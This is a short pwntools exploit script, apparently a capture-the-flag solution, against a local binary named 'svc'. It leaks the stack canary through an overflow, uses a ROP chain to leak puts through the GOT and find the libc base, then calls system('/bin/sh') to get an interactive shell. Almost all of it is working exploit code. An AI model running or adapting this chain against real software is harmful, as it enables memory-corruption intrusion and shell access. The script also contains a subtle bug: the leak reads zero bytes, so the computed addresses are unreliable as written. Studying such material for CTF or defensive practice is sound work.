from pwn import *

context.arch = "amd64"
context.binary = "./svc"

elf = ELF("./svc")
libc = ELF("libc-2.23.so")
target = process("./svc")

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
main_addr = 0x400A96

target.sendlineafter(b">>", b"1")
target.send(b"A" * 169)

target.sendlineafter(b">>", b"2")
target.recvuntil(b"A" * 169)
canary_raw = target.recv(7)
canary = u64(b"\x00" + canary_raw)
log.info(f"Canary: {hex(canary)}")

padding = b"A" * 168
saved_rbp = b"B" * 8

payload1 = flat(
    padding,
    canary,
    saved_rbp,
    pop_rdi,
    puts_got,
    puts_plt,
    main_addr,
)

target.sendlineafter(b">>", b"1")
target.send(payload1)
target.sendlineafter(b">>", b"3")

target.recvuntil(b"[*]BYE ~ TIME TO MINE MIENRALS...\n")
leaked_puts = u64(target.recv(0).ljust(8, b"\x00"))

libc_base = leaked_puts - libc.symbols["puts"]
log.info(f"Libc base: {hex(libc_base)}")

system_addr = libc_base + libc.symbols["system"]
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh"))

payload2 = flat(
    padding,
    canary,
    saved_rbp,
    pop_rdi,
    bin_sh_addr,
    system_addr,
)

target.sendlineafter(b">>", b"1")
target.send(payload2)
target.sendlineafter(b">>", b"3")
target.interactive()
